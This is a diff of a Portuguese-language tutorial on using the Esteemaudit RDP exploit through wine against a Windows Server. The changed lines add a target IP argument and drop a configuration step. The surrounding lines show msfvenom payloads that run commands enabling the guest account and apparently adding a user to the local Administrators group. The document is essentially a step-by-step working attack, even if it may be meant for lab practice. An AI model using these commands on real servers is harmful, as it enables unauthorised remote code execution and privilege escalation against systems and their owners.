@@ -60,10 +60,6 @@ cp -r esteemaudit/ /usr/share/
 cd /usr/share/esteemaudit
 ```
 
-No arquivo **Esteemaudit-2.1.0.xml**, na linha nº 5 é necessário informar o IP do Windows Server e a porta TCP do serviço RDP (3389 é o padrão):
-
-![image](https://user-images.githubusercontent.com/76706456/186801171-388f3d39-a25c-412b-b868-d70aa20815ba.png)
-
 **Vamos gerar os payloads com os comandos que desejamos executar no Windows Server:**
 
 Neste exemplo, iremos habilitar o usuário convidado, gerando o seguinte payload:
@@ -74,7 +70,7 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net user guest /active:y
 
 Em seguida iremos envia-lo para o servidor:
 ```
-wine Esteemaudit-2.1.0.exe
+wine Esteemaudit-2.1.0.exe --TargetIp 172.16.1.110
 ```
 
 ![image](https://user-images.githubusercontent.com/76706456/186801388-f88fcc11-938e-4cba-be60-2b56e2a821ff.png)
@@ -90,7 +86,7 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD='net localgroup "Administ
 
 Em seguida iremos envia-lo para o servidor:
 ```
-wine Esteemaudit-2.1.0.exe
+wine Esteemaudit-2.1.0.exe --TargetIp 172.16.1.110
 ```
 
 ![image](https://user-images.githubusercontent.com/76706456/186801388-f88fcc11-938e-4cba-be60-2b56e2a821ff.png)
